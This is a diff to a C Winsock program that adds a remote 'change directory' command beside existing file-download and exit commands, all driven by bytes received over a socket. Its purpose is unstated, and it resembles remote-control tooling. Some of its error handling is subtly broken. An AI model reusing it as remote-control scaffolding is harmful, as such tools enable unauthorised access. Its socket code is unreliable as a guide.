@@ -7,7 +7,6 @@ int main(int argc, char * argv[])
 
 	fileWrapper file;
 
-
 	//Main program
 	while(1){
 		setupvar(&file);
@@ -85,7 +84,7 @@ int main(int argc, char * argv[])
 					return -1;
 				} else {
 					/*process received data*/
-					int q = processdata(s, buf[0]);
+					int q = processdata(s, buf[0], buf[1]);
 					if(q < 0){
 
 						goto close;
@@ -190,7 +189,7 @@ int setupvar(fileWrapper * file)
 
 }
 
-int processdata(SOCKET s, char cmd)
+int processdata(SOCKET s, char cmd, char cmd2)
 {
 	char buf[BUFSIZE] = "";
 	int bytesSent = 0;
@@ -199,9 +198,41 @@ int processdata(SOCKET s, char cmd)
 	int * pbs = &bytesSent;
 	int * pbr = &bytesRecv;
 
-	if(iscommand(cmd) == 1 || iscommand(cmd) == 2){
+	if(iscommand(cmd) == 1 || iscommand(cmd) == 2 || iscommand(cmd) == 3){
 
-		if(iscommand(cmd) == 2){	// exit command
+		if(iscommand(cmd) == 3 && iscommand(cmd2) == 4){
+
+			memset(buf, 0, BUFSIZE);
+			strcpy(buf, "#!cd >");
+
+			*pbs = send(s, buf, BUFSIZE, 0);
+			if(*pbs == SOCKET_ERROR) {
+				if(WSAGetLastError() != WSAECONNREFUSED
+				|| WSAGetLastError() == WSAECONNRESET){
+					return -2;
+				} else {
+					return -1;
+				}
+			}
+
+			memset(buf, 0, BUFSIZE);
+			*pbr = SOCKET_ERROR;
+			while(*pbr == SOCKET_ERROR){
+				*pbr = recv(s, buf, BUFSIZE, 0);
+				if(*pbr == 0 || *pbr == WSAECONNRESET){
+					return -2;
+				}
+
+				if(*pbr < 0){
+					return -1;
+				} else {
+					change_dir(buf);
+					memset(buf, 0, BUFSIZE);
+					strcpy(buf, "changed dir\n");
+				}
+			}
+
+		}else if(iscommand(cmd) == 2){	// exit command
 			memset(buf, 0, BUFSIZE);
 			return -1;
 		} else if (iscommand(cmd) == 1) { //file download command
@@ -263,9 +294,18 @@ int iscommand(char buf)
 		return 1;
 	} else if(buf == '&') {
 		return 2;
+	} else if(buf == 'c') {
+		return 3;
+	} else if(buf == 'd') {
+		return 4;
 	} else {
 		return 0;
 	}
+}
+
+void change_dir(char * dir)
+{
+	chdir(dir);
 }
 
 /*Downloader func
